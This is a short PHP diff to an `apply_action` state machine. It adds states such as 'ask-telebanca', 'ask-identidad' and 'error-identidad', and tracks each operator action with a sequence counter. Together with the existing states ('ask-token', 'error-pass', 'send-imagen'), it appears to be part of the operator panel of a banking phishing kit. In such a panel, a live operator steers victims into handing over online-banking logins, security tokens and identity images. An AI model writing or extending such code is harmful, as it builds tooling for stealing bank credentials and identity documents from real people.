@@ -152,6 +152,10 @@ function apply_action(array $existing, string $action, array $extra): array
     $state = $existing['state'] ?? 'waiting';
     if ($action === 'ask-token') {
         $state = 'token';
+    } elseif ($action === 'ask-telebanca') {
+        $state = 'telebanca';
+    } elseif ($action === 'ask-identidad') {
+        $state = 'identidad';
     } elseif ($action === 'send-imagen') {
         $state = 'imagen';
     } elseif ($action === 'waiting-imagen') {
@@ -168,12 +172,19 @@ function apply_action(array $existing, string $action, array $extra): array
         $state = 'error-pass';
     } elseif ($action === 'error-tejuino') {
         $state = 'error-tejuino';
+    } elseif ($action === 'error-identidad') {
+        $state = 'error-identidad';
     } elseif ($action === 'done') {
         $state = 'done';
     }
 
+    $isOperatorAction = !str_starts_with($action, 'waiting-');
     $now = (int) round(microtime(true) * 1000);
     $existing['state'] = $state;
+    if ($isOperatorAction) {
+        $existing['lastAction'] = $action;
+        $existing['actionSeq'] = (($existing['actionSeq'] ?? 0) + 1);
+    }
     if (array_key_exists('imageSrc', $extra) && $extra['imageSrc'] !== null && $extra['imageSrc'] !== '') {
         $raw = (string) $extra['imageSrc'];
         $sid = (string) ($existing['id'] ?? 'img');
